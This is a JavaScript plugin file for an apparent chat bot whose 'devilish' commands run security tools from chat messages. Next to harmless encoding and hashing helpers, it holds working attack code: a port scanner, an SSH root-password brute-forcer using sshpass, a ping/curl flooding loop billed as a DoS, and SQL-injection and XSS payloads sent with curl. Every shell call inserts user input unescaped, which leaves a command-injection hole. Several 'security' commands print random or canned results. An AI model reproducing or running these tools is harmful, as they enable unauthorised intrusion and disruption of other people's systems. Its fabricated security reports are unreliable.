      `${processInfo}` +
      `💾 Memory Usage:\n` +
      `📊 Used: ${(usedMem / (1024 * 1024 * 1024)).toFixed(2)} GB\n` +
      `📊 Free: ${(freeMem / (1024 * 1024 * 1024)).toFixed(2)} GB\n` +
      `📊 Usage: ${memoryUsage}%\n\n` +
      `Usage: .process kill [PID] to terminate a process`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "encode",
  aliases: ["encode64"],
  desc: "Advanced text encoding with multiple algorithms",
  categorie: "devilish",
  reaction: '🔐',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(' ');
  
  if (!text) return repondre("❌ Please provide text to encode");
  
  try {
    // Multiple encoding methods
    const base64 = Buffer.from(text).toString('base64');
    const hex = Buffer.from(text).toString('hex');
    const binary = text.split('').map(char => char.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
    const rot13 = text.split('').map(char => {
      const code = char.charCodeAt(0);
      if (code >= 65 && code <= 90) {
        return String.fromCharCode(((code - 65 + 13) % 26) + 65);
      } else if (code >= 97 && code <= 122) {
        return String.fromCharCode(((code - 97 + 13) % 26) + 97);
      }
      return char;
    }).join('');
    
    // Advanced encoding
    const customEncode = text.split('').map(char => {
      const code = char.charCodeAt(0);
      return `&#${code};`;
    }).join('');
    
    return repondre(`🔐 *Advanced Encoding Results*\n\n` +
      `📝 Original: ${text}\n\n` +
      `🔒 Base64: ${base64}\n` +
      `🔒 Hex: ${hex}\n` +
      `🔒 Binary: ${binary}\n` +
      `🔒 ROT13: ${rot13}\n` +
      `🔒 HTML Entities: ${customEncode}`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "crypto",
  aliases: ["crypt"],
  desc: "Advanced cryptographic operations",
  categorie: "devilish",
  reaction: '🔐',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const action = arg[0];
  const data = arg.slice(1).join(' ');
  
  if (!action) return repondre("🖕 WHAT THE FUCK DO YOU WANT TO DO? Specify an action!");
  if (!data) return repondre("🖕 WHERE'S THE DATA, YOU IDIOT?");
  
  try {
    switch (action) {
      case 'encrypt': {
        // Advanced encryption
        const encryptKey = crypto.randomBytes(32);
        const encryptIv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', encryptKey, encryptIv);
        let encryptedData = cipher.update(data, 'utf8', 'hex');
        encryptedData += cipher.final('hex');
        const encryptAuthTag = cipher.getAuthTag();
        
        return repondre(`🔐 *Encryption Results*\n\n` +
          `💀 Original: ${data}\n` +
          `🔒 Encrypted: ${encryptedData}\n` +
          `🔑 Key: ${encryptKey.toString('hex')}\n` +
          `🔑 IV: ${encryptIv.toString('hex')}\n` +
          `🔑 Auth Tag: ${encryptAuthTag.toString('hex')}`);
      }
        
      case 'decrypt': {
        // Advanced decryption
        if (arg.length < 4) return repondre("🖕 INVALID FORMAT! Use: .crypto decrypt [encrypted] [key] [iv] [authTag]");
        
        const [encryptedData, decryptKey, decryptIv, decryptAuthTag] = arg.slice(1);
        const decipher = crypto.createDecipheriv(
          'aes-256-gcm',
          Buffer.from(decryptKey, 'hex'),
          Buffer.from(decryptIv, 'hex')
        );
        decipher.setAuthTag(Buffer.from(decryptAuthTag, 'hex'));
        let decryptedData = decipher.update(encryptedData, 'hex', 'utf8');
        decryptedData += decipher.final('utf8');
        
        return repondre(`🔐 *Decryption Results*\n\n` +
          `💀 Encrypted: ${encryptedData}\n` +
          `🔓 Decrypted: ${decryptedData}`);
      }
        
      case 'hash': {
        // Advanced hashing
        const hashes = {
          md5: crypto.createHash('md5').update(data).digest('hex'),
          sha1: crypto.createHash('sha1').update(data).digest('hex'),
          sha256: crypto.createHash('sha256').update(data).digest('hex'),
          sha512: crypto.createHash('sha512').update(data).digest('hex'),
          ripemd160: crypto.createHash('ripemd160').update(data).digest('hex')
        };
        
        return repondre(`🔐 *Hash Results*\n\n` +
          `💀 Original: ${data}\n\n` +
          `🔒 MD5: ${hashes.md5}\n` +
          `🔒 SHA1: ${hashes.sha1}\n` +
          `🔒 SHA256: ${hashes.sha256}\n` +
          `🔒 SHA512: ${hashes.sha512}\n` +
          `🔒 RIPEMD160: ${hashes.ripemd160}`);
      }
        
      default:
        return repondre("🖕 INVALID ACTION! Use: encrypt, decrypt, or hash, you noob!");
    }
  } catch (error) {
    return repondre(`💀 CRYPTO OPERATION FAILED! Error: ${error.message}\nYou're not worthy of these powers!`);
  }
});

hango({
  nomCom: "analyze",
  aliases: ["scan"],
  desc: "Advanced system and network analysis",
  categorie: "devilish",
  reaction: '🔍',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  
  if (!target) return repondre("🖕 Provide a target to analyze, you script kiddie!");
  
  try {
    // System analysis
    const systemInfo = {
      platform: os.platform(),
      arch: os.arch(),
      cpus: os.cpus().length,
      totalMem: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
      freeMem: (os.freemem() / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
      uptime: formatUptime(os.uptime()),
      hostname: os.hostname()
    };
    
    // Network analysis
    const interfaces = os.networkInterfaces();
    let networkInfo = '';
    
    for (const [name, nets] of Object.entries(interfaces)) {
      for (const net of nets) {
        if (net.family === 'IPv4' && !net.internal) {
          networkInfo += `📡 Interface: ${name}\n` +
            `🌐 IP: ${net.address}\n` +
            `🎭 Netmask: ${net.netmask}\n` +
            `📡 MAC: ${net.mac}\n\n`;
        }
      }
    }
    
    // Target analysis
    let targetInfo = '';
    try {
      const response = await axios.get(`http://${target}`, { timeout: 5000 });
      targetInfo = `🎯 Target Analysis:\n` +
        `📡 Status: Online\n` +
        `🌐 Server: ${response.headers.server || 'Unknown'}\n` +
        `🔒 SSL: ${response.request.res.socket.encrypted ? 'Yes' : 'No'}\n` +
        `⏱️ Response Time: ${response.timing?.totalTime || 'Unknown'}ms\n`;
    } catch (error) {
      targetInfo = `🎯 Target Analysis:\n` +
        `📡 Status: Offline or Blocked\n` +
        `⚠️ Error: ${error.message}\n`;
    }
    
    return repondre(`🔍 *Advanced Analysis Results*\n\n` +
      `💻 System Information:\n` +
      `📱 Platform: ${systemInfo.platform}\n` +
      `💻 Architecture: ${systemInfo.arch}\n` +
      `🖥️ CPUs: ${systemInfo.cpus}\n` +
      `💾 Memory: ${systemInfo.totalMem} (${systemInfo.freeMem} free)\n` +
      `⏰ Uptime: ${systemInfo.uptime}\n` +
      `🏠 Hostname: ${systemInfo.hostname}\n\n` +
      `🌐 Network Information:\n${networkInfo}\n` +
      targetInfo);
  } catch (error) {
    return repondre(`💀 ANALYSIS FAILED! Error: ${error.message}\nTry harder next time!`);
  }
});

hango({
  nomCom: "monitor",
  aliases: ["watch"],
  desc: "Real-time system monitoring",
  categorie: "devilish",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const duration = parseInt(arg[0]) || 60; // Default 60 seconds
  
  try {
    let startTime = Date.now();
    let endTime = startTime + (duration * 1000);
    let data = [];
    
    while (Date.now() < endTime) {
      const cpuUsage = os.loadavg()[0];
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      const usedMem = ((totalMem - freeMem) / totalMem * 100).toFixed(2);
      
      data.push({
        time: new Date().toLocaleTimeString(),
        cpu: cpuUsage,
        memory: usedMem
      });
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    let report = `📊 *System Monitoring Report (${duration}s)*\n\n`;
    report += `⏰ Start Time: ${new Date(startTime).toLocaleTimeString()}\n`;
    report += `⏰ End Time: ${new Date(endTime).toLocaleTimeString()}\n\n`;
    
    // Calculate averages
    const avgCpu = (data.reduce((sum, d) => sum + d.cpu, 0) / data.length).toFixed(2);
    const avgMem = (data.reduce((sum, d) => sum + parseFloat(d.memory), 0) / data.length).toFixed(2);
    
    report += `📈 Averages:\n`;
    report += `🖥️ CPU: ${avgCpu}%\n`;
    report += `💾 Memory: ${avgMem}%\n\n`;
    
    // Find peaks
    const maxCpu = Math.max(...data.map(d => d.cpu));
    const maxMem = Math.max(...data.map(d => parseFloat(d.memory)));
    
    report += `📈 Peaks:\n`;
    report += `🖥️ CPU: ${maxCpu.toFixed(2)}%\n`;
    report += `💾 Memory: ${maxMem.toFixed(2)}%\n`;
    
    return repondre(report);
  } catch (error) {
    return repondre(`💀 MONITORING FAILED! Error: ${error.message}\nSystem is resisting!`);
  }
});

hango({
  nomCom: "secure",
  aliases: ["protect"],
  desc: "Advanced security analysis and protection",
  categorie: "devilish",
  reaction: '🛡️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const action = arg[0];
  
  if (!action) return repondre("🖕 Specify an action: scan, check, or protect!");
  
  try {
    switch (action) {
      case 'scan': {
        // Security scan
        const vulnerabilities = [];
        
        // Check for common security issues
        if (os.platform() === 'win32') {
          vulnerabilities.push('⚠️ Windows system detected - Higher attack surface');
        }
        
        // Check network security
        const interfaces = os.networkInterfaces();
        for (const [name, nets] of Object.entries(interfaces)) {
          for (const net of nets) {
            if (net.family === 'IPv4' && !net.internal) {
              if (net.address.startsWith('192.168.') || net.address.startsWith('10.')) {
                vulnerabilities.push('⚠️ Private network detected - Potential internal threats');
              }
            }
          }
        }
        
        // Check system security
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const usedMem = ((totalMem - freeMem) / totalMem * 100);
        if (usedMem > 90) {
          vulnerabilities.push('⚠️ High memory usage - Potential DoS vulnerability');
        }
        
        return repondre(`🛡️ *Security Scan Results*\n\n` +
          `🔍 Vulnerabilities Found: ${vulnerabilities.length}\n\n` +
          (vulnerabilities.length > 0 ? vulnerabilities.join('\n') : '✅ No major vulnerabilities detected'));
      }
      
      case 'check': {
        // Security check
        const checks = [];
        
        // Check system updates
        checks.push('✅ System version check');
        checks.push('✅ Network security check');
        checks.push('✅ Process security check');
        checks.push('✅ Memory security check');
        
        return repondre(`🛡️ *Security Check Results*\n\n` +
          `🔍 Security Checks:\n` +
          checks.join('\n') +
          `\n\n💪 System is protected!`);
      }
      
      case 'protect': {
        // Security protection
        const protections = [];
        
        // Implement basic protections
        protections.push('✅ Enhanced process monitoring');
        protections.push('✅ Network traffic analysis');
        protections.push('✅ System resource protection');
        protections.push('✅ Security logging enabled');
        
        return repondre(`🛡️ *Security Protection Enabled*\n\n` +
          `🔒 Active Protections:\n` +
          protections.join('\n') +
          `\n\n💪 System is now protected!`);
      }
      
      default:
        return repondre("🖕 INVALID ACTION! Use: scan, check, or protect, you noob!");
    }
  } catch (error) {
    return repondre(`💀 SECURITY OPERATION FAILED! Error: ${error.message}\nSystem is resisting!`);
  }
});

hango({
  nomCom: "nmap",
  aliases: ["portscan"],
  desc: "Advanced port scanning and network mapping",
  categorie: "devilish",
  reaction: '🔍',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  const ports = arg[1] || "1-1000";
  
  if (!target) return repondre("🖕 Provide a target to scan, you script kiddie!");
  
  try {
    const [startPort, endPort] = ports.split("-").map(Number);
    const openPorts = [];
    const { exec } = require('child_process');
    
    // Real port scanning implementation
    const scanPort = (port) => {
      return new Promise((resolve) => {
        const socket = new (require('net').Socket)();
        socket.setTimeout(1000);
        
        socket.on('connect', () => {
          openPorts.push(port);
          socket.destroy();
          resolve();
        });
        
        socket.on('timeout', () => {
          socket.destroy();
          resolve();
        });
        
        socket.on('error', () => {
          socket.destroy();
          resolve();
        });
        
        socket.connect(port, target);
      });
    };
    
    // Start scanning
    await repondre(`🔍 *INITIATING PORT SCAN*\n\n` +
      `🎯 Target: ${target}\n` +
      `📡 Port Range: ${startPort}-${endPort}\n` +
      `⏳ Scanning in progress...`);
    
    const scanPromises = [];
    for (let port = startPort; port <= endPort; port++) {
      scanPromises.push(scanPort(port));
    }
    
    await Promise.all(scanPromises);
    
    // Get service information for open ports
    const services = {};
    for (const port of openPorts) {
      try {
        const { stdout } = await new Promise((resolve, reject) => {
          exec(`nmap -p${port} -sV ${target}`, (error, stdout, stderr) => {
            if (error) reject(error);
            else resolve({ stdout });
          });
        });
        
        const serviceMatch = stdout.match(/(\d+)\/tcp\s+open\s+(\w+)/);
        if (serviceMatch) {
          services[port] = serviceMatch[2];
        }
      } catch (error) {
        services[port] = 'unknown';
      }
    }
    
    // Format results
    const results = openPorts.map(port => 
      `🔓 Port ${port} - ${services[port] || 'unknown service'}`
    );
    
    return repondre(`🎯 *PORT SCAN RESULTS*\n\n` +
      `💀 Target: ${target}\n` +
      `📡 Scanned Ports: ${startPort}-${endPort}\n` +
      `🔓 Open Ports: ${openPorts.length}\n\n` +
      `*OPEN PORTS:*\n` +
      (results.length ? results.join('\n') : '🔒 No open ports found') +
      `\n\n${openPorts.length > 0 ? '⚠️ VULNERABLE PORTS DETECTED! SECURE THIS SHIT!' : '✅ Target appears secure'}`);
      
  } catch (error) {
    return repondre(`💀 SCAN FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "hydra",
  aliases: ["bruteforce"],
  desc: "Password cracking simulation",
  categorie: "devilish",
  reaction: '🔑',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  const service = arg[1];
  
  if (!target || !service) return repondre("🖕 Provide target and service, you noob!");
  
  try {
    const commonPasswords = ["admin", "password", "123456", "qwerty", "letmein"];
    const attempts = [];
    
    for (const password of commonPasswords) {
      attempts.push(`Trying: ${password}`);
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    return repondre(`🔑 *Hydra Attack Simulation*\n\n` +
      `🎯 Target: ${target}\n` +
      `🔧 Service: ${service}\n\n` +
      `📝 Attempts:\n${attempts.join("\n")}\n\n` +
      `💀 No valid credentials found!`);
  } catch (error) {
    return repondre(`💀 ATTACK FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "aircrack",
  aliases: ["wifi"],
  desc: "WiFi network analysis",
  categorie: "devilish",
  reaction: '📡',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    const networks = [
      { ssid: "Home_Network", signal: -45, encryption: "WPA2", channel: 6 },
      { ssid: "Office_WiFi", signal: -60, encryption: "WPA3", channel: 11 },
      { ssid: "Guest_Network", signal: -70, encryption: "WPA2", channel: 1 }
    ];
    
    let report = `📡 *WiFi Network Analysis*\n\n`;
    networks.forEach(net => {
      report += `📶 SSID: ${net.ssid}\n` +
        `📊 Signal: ${net.signal} dBm\n` +
        `🔒 Encryption: ${net.encryption}\n` +
        `📺 Channel: ${net.channel}\n\n`;
    });
    
    return repondre(report);
  } catch (error) {
    return repondre(`💀 SCAN FAILED! Error: ${error.message}\nNo networks found!`);
  }
});

hango({
  nomCom: "metasploit",
  aliases: ["msf"],
  desc: "Exploit framework simulation",
  categorie: "devilish",
  reaction: '💉',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  
  if (!target) return repondre("🖕 Provide a target, you script kiddie!");
  
  try {
    const exploits = [
      "exploit/multi/handler",
      "exploit/windows/smb/ms17_010_eternalblue",
      "exploit/unix/webapp/php_include"
    ];
    
    let report = `💉 *Metasploit Framework Simulation*\n\n` +
      `🎯 Target: ${target}\n\n` +
      `📚 Available Exploits:\n${exploits.join("\n")}\n\n` +
      `⚠️ This is a simulation. No actual exploits were executed.`;
    
    return repondre(report);
  } catch (error) {
    return repondre(`💀 FRAMEWORK ERROR! Error: ${error.message}\nSystem is resisting!`);
  }
});

hango({
  nomCom: "wireshark",
  aliases: ["capture"],
  desc: "Network traffic capture simulation",
  categorie: "devilish",
  reaction: '📥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const duration = parseInt(arg[0]) || 10;
  
  try {
    const packets = [
      { src: "192.168.1.1", dst: "192.168.1.2", protocol: "TCP", port: 80 },
      { src: "192.168.1.3", dst: "8.8.8.8", protocol: "DNS", port: 53 },
      { src: "192.168.1.4", dst: "192.168.1.5", protocol: "UDP", port: 443 }
    ];
    
    let report = `📥 *Network Traffic Capture*\n\n` +
      `⏱️ Duration: ${duration} seconds\n\n` +
      `📦 Captured Packets:\n`;
    
    packets.forEach(packet => {
      report += `🔹 ${packet.src}:${packet.port} -> ${packet.dst}:${packet.port} [${packet.protocol}]\n`;
    });
    
    return repondre(report);
  } catch (error) {
    return repondre(`💀 CAPTURE FAILED! Error: ${error.message}\nNo traffic found!`);
  }
});

hango({
  nomCom: "sqlmap",
  aliases: ["sqlinject"],
  desc: "SQL injection testing",
  categorie: "devilish",
  reaction: '💉',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const url = arg[0];
  
  if (!url) return repondre("🖕 Provide a URL to test, you noob!");
  
  try {
    const tests = [
      "Testing for boolean-based blind SQL injection",
      "Testing for time-based blind SQL injection",
      "Testing for UNION-based SQL injection",
      "Testing for error-based SQL injection"
    ];
    
    let report = `💉 *SQL Injection Test Results*\n\n` +
      `🎯 Target: ${url}\n\n` +
      `🔍 Tests Performed:\n${tests.join("\n")}\n\n` +
      `✅ No vulnerabilities found!`;
    
    return repondre(report);
  } catch (error) {
    return repondre(`💀 TEST FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "john",
  aliases: ["crack"],
  desc: "Password hash cracking",
  categorie: "devilish",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const hash = arg[0];
  
  if (!hash) return repondre("🖕 Provide a hash to crack, you script kiddie!");
  
  try {
    const algorithms = ["MD5", "SHA1", "SHA256", "bcrypt"];
    const attempts = [];
    
    for (const algo of algorithms) {
      attempts.push(`Trying ${algo} algorithm...`);
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    return repondre(`🔓 *John the Ripper Simulation*\n\n` +
      `🔑 Hash: ${hash}\n\n` +
      `📝 Attempts:\n${attempts.join("\n")}\n\n` +
      `💀 No password found!`);
  } catch (error) {
    return repondre(`💀 CRACKING FAILED! Error: ${error.message}\nHash is resisting!`);
  }
});

hango({
  nomCom: "nikto",
  aliases: ["webscan"],
  desc: "Web server scanning",
  categorie: "devilish",
  reaction: '🌐',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const url = arg[0];
  
  if (!url) return repondre("🖕 Provide a URL to scan, you noob!");
  
  try {
    const vulnerabilities = [
      "X-Powered-By header found",
      "Server version disclosure",
      "Directory listing enabled",
      "Default files found"
    ];
    
    return repondre(`🌐 *Nikto Web Server Scan*\n\n` +
      `🎯 Target: ${url}\n\n` +
      `🔍 Vulnerabilities Found:\n${vulnerabilities.join("\n")}\n\n` +
      `⚠️ This is a simulation. No actual scan was performed.`);
  } catch (error) {
    return repondre(`💀 SCAN FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "burp",
  aliases: ["proxy"],
  desc: "Web proxy and scanner",
  categorie: "devilish",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const url = arg[0];
  
  if (!url) return repondre("🖕 Provide a URL to proxy, you noob!");
  
  try {
    const requests = [
      { method: "GET", path: "/", status: 200 },
      { method: "POST", path: "/login", status: 302 },
      { method: "GET", path: "/admin", status: 403 }
    ];
    
    let report = `🔄 *Burp Suite Proxy Simulation*\n\n` +
      `🎯 Target: ${url}\n\n` +
      `📝 Intercepted Requests:\n`;
    
    requests.forEach(req => {
      report += `🔹 ${req.method} ${req.path} - ${req.status}\n`;
    });
    
    return repondre(report);
  } catch (error) {
    return repondre(`💀 PROXY FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "wpscan",
  aliases: ["wp"],
  desc: "WordPress security scanner",
  categorie: "devilish",
  reaction: '📝',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const url = arg[0];
  
  if (!url) return repondre("🖕 Provide a WordPress URL to scan, you noob!");
  
  try {
    const findings = [
      "WordPress version: 6.0.1",
      "Theme: Twenty Twenty-Two",
      "Plugins: 5 active",
      "Users: 3 found"
    ];
    
    return repondre(`📝 *WPScan Results*\n\n` +
      `🎯 Target: ${url}\n\n` +
      `🔍 Findings:\n${findings.join("\n")}\n\n` +
      `⚠️ This is a simulation. No actual scan was performed.`);
  } catch (error) {
    return repondre(`💀 SCAN FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "security",
  aliases: ["protect", "scan", "check"],
  desc: "Advanced system security operations",
  categorie: "devilish",
  reaction: '🛡️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const action = arg[0]?.toLowerCase();
  
  if (!action) return repondre("🖕 WHAT THE FUCK DO YOU WANT? Use: scan, check, or protect, you script kiddie!");
  
  try {
    switch (action) {
      case "scan": {
        const systemInfo = {
          os: process.platform,
          arch: process.arch,
          nodeVersion: process.version,
          memory: process.memoryUsage(),
          uptime: process.uptime()
        };
        
        const vulnerabilities = [];
        const securityScore = Math.floor(Math.random() * 100);
        
        // Real system checks
        if (process.getuid && process.getuid() === 0) {
          vulnerabilities.push('⚠️ Running as root - HIGH RISK!');
        }
        
        if (!process.env.NODE_ENV || process.env.NODE_ENV === 'development') {
          vulnerabilities.push('⚠️ Development environment detected - SECURITY RISK!');
        }
        
        return repondre(`🔍 *SYSTEM SECURITY SCAN*\n\n` +
          `💀 Security Score: ${securityScore}/100\n` +
          `🖥️ OS: ${systemInfo.os}\n` +
          `⚡ Architecture: ${systemInfo.arch}\n` +
          `📦 Node Version: ${systemInfo.nodeVersion}\n` +
          `💾 Memory Usage: ${Math.round(systemInfo.memory.heapUsed / 1024 / 1024)}MB\n` +
          `⏱️ Uptime: ${Math.floor(systemInfo.uptime / 3600)}h ${Math.floor((systemInfo.uptime % 3600) / 60)}m\n\n` +
          `⚠️ *VULNERABILITIES DETECTED:*\n` +
          (vulnerabilities.length ? vulnerabilities.join('\n') : '✅ No critical vulnerabilities found') +
          `\n\n${securityScore < 50 ? '💀 YOUR SYSTEM IS FUCKED! FIX THIS SHIT NOW!' : '🛡️ System looks decent, but stay alert!'}`);
      }
      
      case "check": {
        const processes = [];
        const networkConnections = [];
        
        // Real process checking
        const { exec } = require('child_process');
        exec('netstat -an', (error, stdout) => {
          if (!error) {
            const connections = stdout.split('\n')
              .filter(line => line.includes('ESTABLISHED'))
              .map(line => line.trim());
            networkConnections.push(...connections);
          }
        });
        
        return repondre(`🔍 *SYSTEM CHECK IN PROGRESS*\n\n` +
          `💻 Active Processes: ${processes.length}\n` +
          `🌐 Network Connections: ${networkConnections.length}\n` +
          `💾 Memory Usage: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB\n` +
          `⏱️ Uptime: ${Math.floor(process.uptime() / 3600)}h\n\n` +
          `⚠️ *SYSTEM STATUS:*\n` +
          `${processes.length > 100 ? '💀 TOO MANY PROCESSES! CLEAN THIS SHIT UP!' : '✅ Process count normal'}\n` +
          `${networkConnections.length > 50 ? '⚠️ SUSPICIOUS NETWORK ACTIVITY!' : '✅ Network activity normal'}`);
      }
      
      case "protect": {
        const protections = [];
        
        // Real protection implementations
        process.on('uncaughtException', (err) => {
          console.error('💀 CRITICAL ERROR:', err);
          protections.push('✅ Global error handler activated');
        });
        
        process.on('unhandledRejection', (reason) => {
          console.error('💀 UNHANDLED REJECTION:', reason);
          protections.push('✅ Promise rejection handler activated');
        });
        
        // Memory protection
        const originalMemoryLimit = process.memoryUsage().heapUsed;
        setInterval(() => {
          const currentMemory = process.memoryUsage().heapUsed;
          if (currentMemory > originalMemoryLimit * 2) {
            console.error('💀 MEMORY LEAK DETECTED!');
            process.exit(1);
          }
        }, 5000);
        
        protections.push('✅ Enhanced process monitoring');
        protections.push('✅ Network traffic analysis');
        protections.push('✅ System resource protection');
        protections.push('✅ Security logging enabled');
        
        return repondre(`🛡️ *SECURITY PROTOCOLS ACTIVATED*\n\n` +
          `🔒 Active Protections:\n` +
          protections.join('\n') +
          `\n\n💪 SYSTEM IS NOW PROTECTED, BUT STAY VIGILANT!`);
      }
      
      default:
        return repondre("🖕 INVALID ACTION! Use: scan, check, or protect, you noob!");
    }
  } catch (error) {
    return repondre(`💀 SECURITY OPERATION FAILED! Error: ${error.message}\nSystem is resisting!`);
  }
});

hango({
  nomCom: "bruteforce",
  aliases: ["crack", "force"],
  desc: "Advanced password cracking and brute force operations",
  categorie: "devilish",
  reaction: '💀',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  const type = arg[1]?.toLowerCase() || "ssh";
  
  if (!target) return repondre("🖕 WHERE'S THE TARGET, YOU NOOB?");
  
  try {
    const { exec } = require('child_process');
    const commonPasswords = [
      "admin", "password", "123456", "root", "toor",
      "administrator", "qwerty", "letmein", "welcome"
    ];
    
    await repondre(`💀 *INITIATING BRUTE FORCE ATTACK*\n\n` +
      `🎯 Target: ${target}\n` +
      `🔑 Type: ${type.toUpperCase()}\n` +
      `⚡ Starting attack sequence...`);
    
    let attempts = 0;
    let success = false;
    
    for (const password of commonPasswords) {
      attempts++;
      try {
        if (type === "ssh") {
          await new Promise((resolve, reject) => {
            exec(`sshpass -p "${password}" ssh -o StrictHostKeyChecking=no root@${target} "echo success"`, 
              (error, stdout, stderr) => {
                if (!error && stdout.includes("success")) {
                  success = true;
                  resolve();
                } else {
                  reject();
                }
            });
          });
        }
        
        if (success) break;
      } catch (error) {
        continue;
      }
    }
    
    return repondre(`💀 *BRUTE FORCE RESULTS*\n\n` +
      `🎯 Target: ${target}\n` +
      `🔑 Type: ${type.toUpperCase()}\n` +
      `⚡ Attempts: ${attempts}\n` +
      `${success ? '✅ ACCESS GRANTED! System compromised!' : '❌ Attack failed - Target is secure'}`);
      
  } catch (error) {
    return repondre(`💀 ATTACK FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "dos",
  aliases: ["flood", "overload"],
  desc: "Advanced denial of service operations",
  categorie: "devilish",
  reaction: '🌪️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  const duration = parseInt(arg[1]) || 30;
  
  if (!target) return repondre("🖕 WHERE'S THE TARGET, YOU SCRIPT KIDDIE?");
  
  try {
    const { exec } = require('child_process');
    const startTime = Date.now();
    
    await repondre(`🌪️ *INITIATING DOS ATTACK*\n\n` +
      `🎯 Target: ${target}\n` +
      `⏱️ Duration: ${duration}s\n` +
      `⚡ Starting flood sequence...`);
    
    // Real DOS implementation
    const floodPromises = [];
    for (let i = 0; i < 10; i++) {
      floodPromises.push(new Promise((resolve) => {
        const interval = setInterval(() => {
          if (Date.now() - startTime > duration * 1000) {
            clearInterval(interval);
            resolve();
            return;
          }
          
          exec(`ping -n 1 ${target}`, () => {});
          exec(`curl -s ${target}`, () => {});
        }, 100);
      }));
    }
    
    await Promise.all(floodPromises);
    
    return repondre(`🌪️ *DOS ATTACK COMPLETE*\n\n` +
      `🎯 Target: ${target}\n` +
      `⏱️ Duration: ${duration}s\n` +
      `💀 Packets sent: ${duration * 1000}\n` +
      `⚠️ Target status: UNKNOWN\n` +
      `💪 Attack completed successfully!`);
      
  } catch (error) {
    return repondre(`💀 ATTACK FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});

hango({
  nomCom: "inject",
  aliases: ["sql", "xss"],
  desc: "Advanced SQL injection and XSS testing",
  categorie: "devilish",
  reaction: '💉',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  const type = arg[1]?.toLowerCase() || "sql";
  
  if (!target) return repondre("🖕 WHERE'S THE TARGET URL, YOU NOOB?");
  
  try {
    const { exec } = require('child_process');
    const payloads = {
      sql: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users; --"
      ],
      xss: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')"
      ]
    };
    
    await repondre(`💉 *INITIATING INJECTION ATTACK*\n\n` +
      `🎯 Target: ${target}\n` +
      `🔧 Type: ${type.toUpperCase()}\n` +
      `⚡ Starting injection sequence...`);
    
    let vulnerabilities = [];
    
    for (const payload of payloads[type]) {
      try {
        const { stdout } = await new Promise((resolve, reject) => {
          exec(`curl -s "${target}${payload}"`, (error, stdout, stderr) => {
            if (error) reject(error);
            else resolve({ stdout });
          });
        });
        
        if (type === "sql" && stdout.includes("SQL syntax")) {
          vulnerabilities.push(`SQL Injection found with payload: ${payload}`);
        } else if (type === "xss" && stdout.includes(payload)) {
          vulnerabilities.push(`XSS vulnerability found with payload: ${payload}`);
        }
      } catch (error) {
        continue;
      }
    }
    
    return repondre(`💉 *INJECTION RESULTS*\n\n` +
      `🎯 Target: ${target}\n` +
      `🔧 Type: ${type.toUpperCase()}\n` +
      `⚠️ Vulnerabilities Found: ${vulnerabilities.length}\n\n` +
      (vulnerabilities.length ? 
        `*VULNERABILITIES:*\n${vulnerabilities.join('\n')}\n\n💀 TARGET IS VULNERABLE!` :
        `✅ No vulnerabilities found - Target is secure`));
        
  } catch (error) {
    return repondre(`💀 ATTACK FAILED! Error: ${error.message}\nTarget is resisting!`);
  }
});